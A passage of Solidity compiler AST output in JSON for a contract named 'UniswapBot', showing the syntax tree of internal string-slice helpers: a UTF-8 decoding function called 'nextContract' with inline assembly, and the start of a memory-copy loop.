																"arguments": [
																	{
																		"arguments": [
																			{
																				"arguments": [
																					{
																						"arguments": [
																							{
																								"arguments": [
																									{
																										"name": "self",
																										"nodeType": "YulIdentifier",
																										"src": "4846:4:0"
																									},
																									{
																										"kind": "number",
																										"nodeType": "YulLiteral",
																										"src": "4852:2:0",
																										"type": "",
																										"value": "32"
																									}
																								],
																								"functionName": {
																									"name": "add",
																									"nodeType": "YulIdentifier",
																									"src": "4842:3:0"
																								},
																								"nodeType": "YulFunctionCall",
																								"src": "4842:13:0"
																							}
																						],
																						"functionName": {
																							"name": "mload",
																							"nodeType": "YulIdentifier",
																							"src": "4836:5:0"
																						},
																						"nodeType": "YulFunctionCall",
																						"src": "4836:20:0"
																					},
																					{
																						"kind": "number",
																						"nodeType": "YulLiteral",
																						"src": "4858:2:0",
																						"type": "",
																						"value": "31"
																					}
																				],
																				"functionName": {
																					"name": "sub",
																					"nodeType": "YulIdentifier",
																					"src": "4832:3:0"
																				},
																				"nodeType": "YulFunctionCall",
																				"src": "4832:29:0"
																			}
																		],
																		"functionName": {
																			"name": "mload",
																			"nodeType": "YulIdentifier",
																			"src": "4826:5:0"
																		},
																		"nodeType": "YulFunctionCall",
																		"src": "4826:36:0"
																	},
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "4864:4:0",
																		"type": "",
																		"value": "0xFF"
																	}
																],
																"functionName": {
																	"name": "and",
																	"nodeType": "YulIdentifier",
																	"src": "4822:3:0"
																},
																"nodeType": "YulFunctionCall",
																"src": "4822:47:0"
															},
															"variableNames": [
																{
																	"name": "b",
																	"nodeType": "YulIdentifier",
																	"src": "4817:1:0"
																}
															]
														}
													]
												},
												"evmVersion": "istanbul",
												"externalReferences": [
													{
														"declaration": 347,
														"isOffset": false,
														"isSlot": false,
														"src": "4817:1:0",
														"valueSize": 1
													},
													{
														"declaration": 315,
														"isOffset": false,
														"isSlot": false,
														"src": "4846:4:0",
														"valueSize": 1
													}
												],
												"id": 349,
												"nodeType": "InlineAssembly",
												"src": "4806:65:0"
											},
											{
												"condition": {
													"argumentTypes": null,
													"commonType": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													},
													"id": 352,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftExpression": {
														"argumentTypes": null,
														"id": 350,
														"name": "b",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 347,
														"src": "4885:1:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "BinaryOperation",
													"operator": "<",
													"rightExpression": {
														"argumentTypes": null,
														"hexValue": "30783830",
														"id": 351,
														"isConstant": false,
														"isLValue": false,
														"isPure": true,
														"kind": "number",
														"lValueRequested": false,
														"nodeType": "Literal",
														"src": "4889:4:0",
														"subdenomination": null,
														"typeDescriptions": {
															"typeIdentifier": "t_rational_128_by_1",
															"typeString": "int_const 128"
														},
														"value": "0x80"
													},
													"src": "4885:8:0",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"falseBody": {
													"condition": {
														"argumentTypes": null,
														"commonType": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														},
														"id": 360,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"lValueRequested": false,
														"leftExpression": {
															"argumentTypes": null,
															"id": 358,
															"name": "b",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 347,
															"src": "4936:1:0",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"nodeType": "BinaryOperation",
														"operator": "<",
														"rightExpression": {
															"argumentTypes": null,
															"hexValue": "30784530",
															"id": 359,
															"isConstant": false,
															"isLValue": false,
															"isPure": true,
															"kind": "number",
															"lValueRequested": false,
															"nodeType": "Literal",
															"src": "4940:4:0",
															"subdenomination": null,
															"typeDescriptions": {
																"typeIdentifier": "t_rational_224_by_1",
																"typeString": "int_const 224"
															},
															"value": "0xE0"
														},
														"src": "4936:8:0",
														"typeDescriptions": {
															"typeIdentifier": "t_bool",
															"typeString": "bool"
														}
													},
													"falseBody": {
														"condition": {
															"argumentTypes": null,
															"commonType": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															},
															"id": 368,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"leftExpression": {
																"argumentTypes": null,
																"id": 366,
																"name": "b",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 347,
																"src": "4987:1:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"nodeType": "BinaryOperation",
															"operator": "<",
															"rightExpression": {
																"argumentTypes": null,
																"hexValue": "30784630",
																"id": 367,
																"isConstant": false,
																"isLValue": false,
																"isPure": true,
																"kind": "number",
																"lValueRequested": false,
																"nodeType": "Literal",
																"src": "4991:4:0",
																"subdenomination": null,
																"typeDescriptions": {
																	"typeIdentifier": "t_rational_240_by_1",
																	"typeString": "int_const 240"
																},
																"value": "0xF0"
															},
															"src": "4987:8:0",
															"typeDescriptions": {
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															}
														},
														"falseBody": {
															"id": 378,
															"nodeType": "Block",
															"src": "5035:32:0",
															"statements": [
																{
																	"expression": {
																		"argumentTypes": null,
																		"id": 376,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": false,
																		"lValueRequested": false,
																		"leftHandSide": {
																			"argumentTypes": null,
																			"id": 374,
																			"name": "l",
																			"nodeType": "Identifier",
																			"overloadedDeclarations": [],
																			"referencedDeclaration": 344,
																			"src": "5050:1:0",
																			"typeDescriptions": {
																				"typeIdentifier": "t_uint256",
																				"typeString": "uint256"
																			}
																		},
																		"nodeType": "Assignment",
																		"operator": "=",
																		"rightHandSide": {
																			"argumentTypes": null,
																			"hexValue": "34",
																			"id": 375,
																			"isConstant": false,
																			"isLValue": false,
																			"isPure": true,
																			"kind": "number",
																			"lValueRequested": false,
																			"nodeType": "Literal",
																			"src": "5054:1:0",
																			"subdenomination": null,
																			"typeDescriptions": {
																				"typeIdentifier": "t_rational_4_by_1",
																				"typeString": "int_const 4"
																			},
																			"value": "4"
																		},
																		"src": "5050:5:0",
																		"typeDescriptions": {
																			"typeIdentifier": "t_uint256",
																			"typeString": "uint256"
																		}
																	},
																	"id": 377,
																	"nodeType": "ExpressionStatement",
																	"src": "5050:5:0"
																}
															]
														},
														"id": 379,
														"nodeType": "IfStatement",
														"src": "4984:83:0",
														"trueBody": {
															"id": 373,
															"nodeType": "Block",
															"src": "4997:32:0",
															"statements": [
																{
																	"expression": {
																		"argumentTypes": null,
																		"id": 371,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": false,
																		"lValueRequested": false,
																		"leftHandSide": {
																			"argumentTypes": null,
																			"id": 369,
																			"name": "l",
																			"nodeType": "Identifier",
																			"overloadedDeclarations": [],
																			"referencedDeclaration": 344,
																			"src": "5012:1:0",
																			"typeDescriptions": {
																				"typeIdentifier": "t_uint256",
																				"typeString": "uint256"
																			}
																		},
																		"nodeType": "Assignment",
																		"operator": "=",
																		"rightHandSide": {
																			"argumentTypes": null,
																			"hexValue": "33",
																			"id": 370,
																			"isConstant": false,
																			"isLValue": false,
																			"isPure": true,
																			"kind": "number",
																			"lValueRequested": false,
																			"nodeType": "Literal",
																			"src": "5016:1:0",
																			"subdenomination": null,
																			"typeDescriptions": {
																				"typeIdentifier": "t_rational_3_by_1",
																				"typeString": "int_const 3"
																			},
																			"value": "3"
																		},
																		"src": "5012:5:0",
																		"typeDescriptions": {
																			"typeIdentifier": "t_uint256",
																			"typeString": "uint256"
																		}
																	},
																	"id": 372,
																	"nodeType": "ExpressionStatement",
																	"src": "5012:5:0"
																}
															]
														}
													},
													"id": 380,
													"nodeType": "IfStatement",
													"src": "4933:134:0",
													"trueBody": {
														"id": 365,
														"nodeType": "Block",
														"src": "4946:32:0",
														"statements": [
															{
																"expression": {
																	"argumentTypes": null,
																	"id": 363,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": false,
																	"lValueRequested": false,
																	"leftHandSide": {
																		"argumentTypes": null,
																		"id": 361,
																		"name": "l",
																		"nodeType": "Identifier",
																		"overloadedDeclarations": [],
																		"referencedDeclaration": 344,
																		"src": "4961:1:0",
																		"typeDescriptions": {
																			"typeIdentifier": "t_uint256",
																			"typeString": "uint256"
																		}
																	},
																	"nodeType": "Assignment",
																	"operator": "=",
																	"rightHandSide": {
																		"argumentTypes": null,
																		"hexValue": "32",
																		"id": 362,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": true,
																		"kind": "number",
																		"lValueRequested": false,
																		"nodeType": "Literal",
																		"src": "4965:1:0",
																		"subdenomination": null,
																		"typeDescriptions": {
																			"typeIdentifier": "t_rational_2_by_1",
																			"typeString": "int_const 2"
																		},
																		"value": "2"
																	},
																	"src": "4961:5:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"id": 364,
																"nodeType": "ExpressionStatement",
																"src": "4961:5:0"
															}
														]
													}
												},
												"id": 381,
												"nodeType": "IfStatement",
												"src": "4881:186:0",
												"trueBody": {
													"id": 357,
													"nodeType": "Block",
													"src": "4895:32:0",
													"statements": [
														{
															"expression": {
																"argumentTypes": null,
																"id": 355,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"leftHandSide": {
																	"argumentTypes": null,
																	"id": 353,
																	"name": "l",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 344,
																	"src": "4910:1:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"nodeType": "Assignment",
																"operator": "=",
																"rightHandSide": {
																	"argumentTypes": null,
																	"hexValue": "31",
																	"id": 354,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": true,
																	"kind": "number",
																	"lValueRequested": false,
																	"nodeType": "Literal",
																	"src": "4914:1:0",
																	"subdenomination": null,
																	"typeDescriptions": {
																		"typeIdentifier": "t_rational_1_by_1",
																		"typeString": "int_const 1"
																	},
																	"value": "1"
																},
																"src": "4910:5:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"id": 356,
															"nodeType": "ExpressionStatement",
															"src": "4910:5:0"
														}
													]
												}
											},
											{
												"condition": {
													"argumentTypes": null,
													"commonType": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													},
													"id": 385,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftExpression": {
														"argumentTypes": null,
														"id": 382,
														"name": "l",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 344,
														"src": "5126:1:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "BinaryOperation",
													"operator": ">",
													"rightExpression": {
														"argumentTypes": null,
														"expression": {
															"argumentTypes": null,
															"id": 383,
															"name": "self",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 315,
															"src": "5130:4:0",
															"typeDescriptions": {
																"typeIdentifier": "t_struct$_slice_$24_memory_ptr",
																"typeString": "struct UniswapBot.slice memory"
															}
														},
														"id": 384,
														"isConstant": false,
														"isLValue": true,
														"isPure": false,
														"lValueRequested": false,
														"memberName": "_len",
														"nodeType": "MemberAccess",
														"referencedDeclaration": 21,
														"src": "5130:9:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"src": "5126:13:0",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"falseBody": null,
												"id": 409,
												"nodeType": "IfStatement",
												"src": "5122:158:0",
												"trueBody": {
													"id": 408,
													"nodeType": "Block",
													"src": "5141:139:0",
													"statements": [
														{
															"expression": {
																"argumentTypes": null,
																"id": 391,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"leftHandSide": {
																	"argumentTypes": null,
																	"expression": {
																		"argumentTypes": null,
																		"id": 386,
																		"name": "rune",
																		"nodeType": "Identifier",
																		"overloadedDeclarations": [],
																		"referencedDeclaration": 317,
																		"src": "5156:4:0",
																		"typeDescriptions": {
																			"typeIdentifier": "t_struct$_slice_$24_memory_ptr",
																			"typeString": "struct UniswapBot.slice memory"
																		}
																	},
																	"id": 388,
																	"isConstant": false,
																	"isLValue": true,
																	"isPure": false,
																	"lValueRequested": true,
																	"memberName": "_len",
																	"nodeType": "MemberAccess",
																	"referencedDeclaration": 21,
																	"src": "5156:9:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"nodeType": "Assignment",
																"operator": "=",
																"rightHandSide": {
																	"argumentTypes": null,
																	"expression": {
																		"argumentTypes": null,
																		"id": 389,
																		"name": "self",
																		"nodeType": "Identifier",
																		"overloadedDeclarations": [],
																		"referencedDeclaration": 315,
																		"src": "5168:4:0",
																		"typeDescriptions": {
																			"typeIdentifier": "t_struct$_slice_$24_memory_ptr",
																			"typeString": "struct UniswapBot.slice memory"
																		}
																	},
																	"id": 390,
																	"isConstant": false,
																	"isLValue": true,
																	"isPure": false,
																	"lValueRequested": false,
																	"memberName": "_len",
																	"nodeType": "MemberAccess",
																	"referencedDeclaration": 21,
																	"src": "5168:9:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"src": "5156:21:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"id": 392,
															"nodeType": "ExpressionStatement",
															"src": "5156:21:0"
														},
														{
															"expression": {
																"argumentTypes": null,
																"id": 398,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"leftHandSide": {
																	"argumentTypes": null,
																	"expression": {
																		"argumentTypes": null,
																		"id": 393,
																		"name": "self",
																		"nodeType": "Identifier",
																		"overloadedDeclarations": [],
																		"referencedDeclaration": 315,
																		"src": "5192:4:0",
																		"typeDescriptions": {
																			"typeIdentifier": "t_struct$_slice_$24_memory_ptr",
																			"typeString": "struct UniswapBot.slice memory"
																		}
																	},
																	"id": 395,
																	"isConstant": false,
																	"isLValue": true,
																	"isPure": false,
																	"lValueRequested": true,
																	"memberName": "_ptr",
																	"nodeType": "MemberAccess",
																	"referencedDeclaration": 23,
																	"src": "5192:9:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"nodeType": "Assignment",
																"operator": "+=",
																"rightHandSide": {
																	"argumentTypes": null,
																	"expression": {
																		"argumentTypes": null,
																		"id": 396,
																		"name": "self",
																		"nodeType": "Identifier",
																		"overloadedDeclarations": [],
																		"referencedDeclaration": 315,
																		"src": "5205:4:0",
																		"typeDescriptions": {
																			"typeIdentifier": "t_struct$_slice_$24_memory_ptr",
																			"typeString": "struct UniswapBot.slice memory"
																		}
																	},
																	"id": 397,
																	"isConstant": false,
																	"isLValue": true,
																	"isPure": false,
																	"lValueRequested": false,
																	"memberName": "_len",
																	"nodeType": "MemberAccess",
																	"referencedDeclaration": 21,
																	"src": "5205:9:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"src": "5192:22:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"id": 399,
															"nodeType": "ExpressionStatement",
															"src": "5192:22:0"
														},
														{
															"expression": {
																"argumentTypes": null,
																"id": 404,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"leftHandSide": {
																	"argumentTypes": null,
																	"expression": {
																		"argumentTypes": null,
																		"id": 400,
																		"name": "self",
																		"nodeType": "Identifier",
																		"overloadedDeclarations": [],
																		"referencedDeclaration": 315,
																		"src": "5229:4:0",
																		"typeDescriptions": {
																			"typeIdentifier": "t_struct$_slice_$24_memory_ptr",
																			"typeString": "struct UniswapBot.slice memory"
																		}
																	},
																	"id": 402,
																	"isConstant": false,
																	"isLValue": true,
																	"isPure": false,
																	"lValueRequested": true,
																	"memberName": "_len",
																	"nodeType": "MemberAccess",
																	"referencedDeclaration": 21,
																	"src": "5229:9:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"nodeType": "Assignment",
																"operator": "=",
																"rightHandSide": {
																	"argumentTypes": null,
																	"hexValue": "30",
																	"id": 403,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": true,
																	"kind": "number",
																	"lValueRequested": false,
																	"nodeType": "Literal",
																	"src": "5241:1:0",
																	"subdenomination": null,
																	"typeDescriptions": {
																		"typeIdentifier": "t_rational_0_by_1",
																		"typeString": "int_const 0"
																	},
																	"value": "0"
																},
																"src": "5229:13:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"id": 405,
															"nodeType": "ExpressionStatement",
															"src": "5229:13:0"
														},
														{
															"expression": {
																"argumentTypes": null,
																"id": 406,
																"name": "rune",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 317,
																"src": "5264:4:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_struct$_slice_$24_memory_ptr",
																	"typeString": "struct UniswapBot.slice memory"
																}
															},
															"functionReturnParameters": 321,
															"id": 407,
															"nodeType": "Return",
															"src": "5257:11:0"
														}
													]
												}
											},
											{
												"expression": {
													"argumentTypes": null,
													"id": 414,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftHandSide": {
														"argumentTypes": null,
														"expression": {
															"argumentTypes": null,
															"id": 410,
															"name": "self",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 315,
															"src": "5292:4:0",
															"typeDescriptions": {
																"typeIdentifier": "t_struct$_slice_$24_memory_ptr",
																"typeString": "struct UniswapBot.slice memory"
															}
														},
														"id": 412,
														"isConstant": false,
														"isLValue": true,
														"isPure": false,
														"lValueRequested": true,
														"memberName": "_ptr",
														"nodeType": "MemberAccess",
														"referencedDeclaration": 23,
														"src": "5292:9:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "Assignment",
													"operator": "+=",
													"rightHandSide": {
														"argumentTypes": null,
														"id": 413,
														"name": "l",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 344,
														"src": "5305:1:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"src": "5292:14:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"id": 415,
												"nodeType": "ExpressionStatement",
												"src": "5292:14:0"
											},
											{
												"expression": {
													"argumentTypes": null,
													"id": 420,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftHandSide": {
														"argumentTypes": null,
														"expression": {
															"argumentTypes": null,
															"id": 416,
															"name": "self",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 315,
															"src": "5317:4:0",
															"typeDescriptions": {
																"typeIdentifier": "t_struct$_slice_$24_memory_ptr",
																"typeString": "struct UniswapBot.slice memory"
															}
														},
														"id": 418,
														"isConstant": false,
														"isLValue": true,
														"isPure": false,
														"lValueRequested": true,
														"memberName": "_len",
														"nodeType": "MemberAccess",
														"referencedDeclaration": 21,
														"src": "5317:9:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "Assignment",
													"operator": "-=",
													"rightHandSide": {
														"argumentTypes": null,
														"id": 419,
														"name": "l",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 344,
														"src": "5330:1:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"src": "5317:14:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"id": 421,
												"nodeType": "ExpressionStatement",
												"src": "5317:14:0"
											},
											{
												"expression": {
													"argumentTypes": null,
													"id": 426,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftHandSide": {
														"argumentTypes": null,
														"expression": {
															"argumentTypes": null,
															"id": 422,
															"name": "rune",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 317,
															"src": "5342:4:0",
															"typeDescriptions": {
																"typeIdentifier": "t_struct$_slice_$24_memory_ptr",
																"typeString": "struct UniswapBot.slice memory"
															}
														},
														"id": 424,
														"isConstant": false,
														"isLValue": true,
														"isPure": false,
														"lValueRequested": true,
														"memberName": "_len",
														"nodeType": "MemberAccess",
														"referencedDeclaration": 21,
														"src": "5342:9:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "Assignment",
													"operator": "=",
													"rightHandSide": {
														"argumentTypes": null,
														"id": 425,
														"name": "l",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 344,
														"src": "5354:1:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"src": "5342:13:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"id": 427,
												"nodeType": "ExpressionStatement",
												"src": "5342:13:0"
											},
											{
												"expression": {
													"argumentTypes": null,
													"id": 428,
													"name": "rune",
													"nodeType": "Identifier",
													"overloadedDeclarations": [],
													"referencedDeclaration": 317,
													"src": "5373:4:0",
													"typeDescriptions": {
														"typeIdentifier": "t_struct$_slice_$24_memory_ptr",
														"typeString": "struct UniswapBot.slice memory"
													}
												},
												"functionReturnParameters": 321,
												"id": 429,
												"nodeType": "Return",
												"src": "5366:11:0"
											}
										]
									},
									"documentation": null,
									"id": 431,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "nextContract",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 318,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 315,
												"mutability": "mutable",
												"name": "self",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 431,
												"src": "4491:17:0",
												"stateVariable": false,
												"storageLocation": "memory",
												"typeDescriptions": {
													"typeIdentifier": "t_struct$_slice_$24_memory_ptr",
													"typeString": "struct UniswapBot.slice"
												},
												"typeName": {
													"contractScope": null,
													"id": 314,
													"name": "slice",
													"nodeType": "UserDefinedTypeName",
													"referencedDeclaration": 24,
													"src": "4491:5:0",
													"typeDescriptions": {
														"typeIdentifier": "t_struct$_slice_$24_storage_ptr",
														"typeString": "struct UniswapBot.slice"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 317,
												"mutability": "mutable",
												"name": "rune",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 431,
												"src": "4510:17:0",
												"stateVariable": false,
												"storageLocation": "memory",
												"typeDescriptions": {
													"typeIdentifier": "t_struct$_slice_$24_memory_ptr",
													"typeString": "struct UniswapBot.slice"
												},
												"typeName": {
													"contractScope": null,
													"id": 316,
													"name": "slice",
													"nodeType": "UserDefinedTypeName",
													"referencedDeclaration": 24,
													"src": "4510:5:0",
													"typeDescriptions": {
														"typeIdentifier": "t_struct$_slice_$24_storage_ptr",
														"typeString": "struct UniswapBot.slice"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "4490:38:0"
									},
									"returnParameters": {
										"id": 321,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 320,
												"mutability": "mutable",
												"name": "",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 431,
												"src": "4552:12:0",
												"stateVariable": false,
												"storageLocation": "memory",
												"typeDescriptions": {
													"typeIdentifier": "t_struct$_slice_$24_memory_ptr",
													"typeString": "struct UniswapBot.slice"
												},
												"typeName": {
													"contractScope": null,
													"id": 319,
													"name": "slice",
													"nodeType": "UserDefinedTypeName",
													"referencedDeclaration": 24,
													"src": "4552:5:0",
													"typeDescriptions": {
														"typeIdentifier": "t_struct$_slice_$24_storage_ptr",
														"typeString": "struct UniswapBot.slice"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "4551:14:0"
									},
									"scope": 1578,
									"src": "4469:916:0",
									"stateMutability": "pure",
									"virtual": false,
									"visibility": "internal"
								},
								{
									"body": {
										"id": 470,
										"nodeType": "Block",
										"src": "5453:492:0",
										"statements": [
											{
												"body": {
													"id": 456,
													"nodeType": "Block",
													"src": "5530:142:0",
													"statements": [
														{
															"AST": {
																"nodeType": "YulBlock",
																"src": "5554:58:0",
																"statements": [
																	{
																		"expression": {
																			"arguments": [
																				{
																					"name": "dest",
																					"nodeType": "YulIdentifier",
																					"src": "5580:4:0"
																				},
																				{
																					"arguments": [
																						{
																							"name": "src",
																							"nodeType": "YulIdentifier",
																							"src": "5592:3:0"
																						}
																					],
																					"functionName": {
																						"name": "mload",
																						"nodeType": "YulIdentifier",
																						"src": "5586:5:0"
																					},
																					"nodeType": "YulFunctionCall",
																					"src": "5586:10:0"
																				}
																			],
																			"functionName": {
																				"name": "mstore",
																				"nodeType": "YulIdentifier",
																				"src": "5573:6:0"
																			},
																			"nodeType": "YulFunctionCall",
																			"src": "5573:24:0"
																		},
																		"nodeType": "YulExpressionStatement",
																		"src": "5573:24:0"
																	}
																]
															},
															"evmVersion": "istanbul",
															"externalReferences": [
																{
																	"declaration": 433,
																	"isOffset": false,
																	"isSlot": false,
																	"src": "5580:4:0",
																	"valueSize": 1
																},
																{
																	"declaration": 435,
																	"isOffset": false,
																	"isSlot": false,
																	"src": "5592:3:0",
																	"valueSize": 1
																}
															],
															"id": 447,
															"nodeType": "InlineAssembly",
															"src": "5545:67:0"
														},
														{
															"expression": {
																"argumentTypes": null,
																"id": 450,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"leftHandSide": {
																	"argumentTypes": null,
																	"id": 448,
																	"name": "dest",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 433,
																	"src": "5626:4:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"nodeType": "Assignment",
																"operator": "+=",
																"rightHandSide": {
																	"argumentTypes": null,
																	"hexValue": "3332",
																	"id": 449,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": true,
																	"kind": "number",
																	"lValueRequested": false,
																	"nodeType": "Literal",
																	"src": "5634:2:0",
																	"subdenomination": null,
																	"typeDescriptions": {
																		"typeIdentifier": "t_rational_32_by_1",
																		"typeString": "int_const 32"
																	},
																	"value": "32"
																},
																"src": "5626:10:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"id": 451,
															"nodeType": "ExpressionStatement",
															"src": "5626:10:0"
														},
														{
															"expression": {
																"argumentTypes": null,
																"id": 454,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"leftHandSide": {
																	"argumentTypes": null,
																	"id": 452,
																	"name": "src",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 435,
																	"src": "5651:3:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"nodeType": "Assignment",
																"operator": "+=",
																"rightHandSide": {
																	"argumentTypes": null,
																	"hexValue": "3332",
																	"id": 453,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": true,
																	"kind": "number",
																	"lValueRequested": false,
																	"nodeType": "Literal",
																	"src": "5658:2:0",
																	"subdenomination": null,
																	"typeDescriptions": {
																		"typeIdentifier": "t_rational_32_by_1",
																		"typeString": "int_const 32"
																	},
																	"value": "32"
																},
																"src": "5651:9:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"id": 455,
															"nodeType": "ExpressionStatement",
															"src": "5651:9:0"
														}
													]
												},
												"condition": {
													"argumentTypes": null,
													"commonType": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													},
													"id": 442,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftExpression": {
														"argumentTypes": null,
														"id": 440,
														"name": "len",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 437,
														"src": "5508:3:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "BinaryOperation",
													"operator": ">=",
													"rightExpression": {
														"argumentTypes": null,
														"hexValue": "3332",
														"id": 441,
														"isConstant": false,
														"isLValue": false,
														"isPure": true,
														"kind": "number",
														"lValueRequested": false,
														"nodeType": "Literal",
														"src": "5515:2:0",
														"subdenomination": null,
														"typeDescriptions": {
															"typeIdentifier": "t_rational_32_by_1",
															"typeString": "int_const 32"
														},
														"value": "32"
													},
													"src": "5508:9:0",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"id": 457,
												"initializationExpression": null,
												"loopExpression": {
													"expression": {
														"argumentTypes": null,
														"id": 445,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"lValueRequested": false,
														"leftHandSide": {
